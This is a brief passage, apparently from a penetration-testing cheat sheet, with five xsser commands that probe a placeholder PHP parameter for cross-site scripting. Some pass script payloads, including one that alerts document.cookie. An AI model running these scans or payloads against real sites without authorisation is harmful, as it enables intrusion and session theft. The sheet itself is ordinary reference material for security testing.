...
`$ xsser -u "http[s]://<IP>" -g "/path/to/uri/index.php?<parameter>=XSS"`

`$ xsser -u "http[s]://<IP>" -g "/path/to/uri/index.php?<parameter>=XSS" --auto`

`$ xsser -u "http[s]://<IP>" -g "/path/to/uri/index.php?<parameter>=XSS" --reverse-check`

`$ xsser -u "http[s]://<IP>" -g "/path/to/uri/index.php?<parameter>=XSS" --payload="<script>alert(\"XSS\")</script>"`

`$ xsser -u "http[s]://<IP>" -g "/path/to/uri/index.php?<parameter>=XSS" --Fp="<script>alert(document.cookie)</script>"`
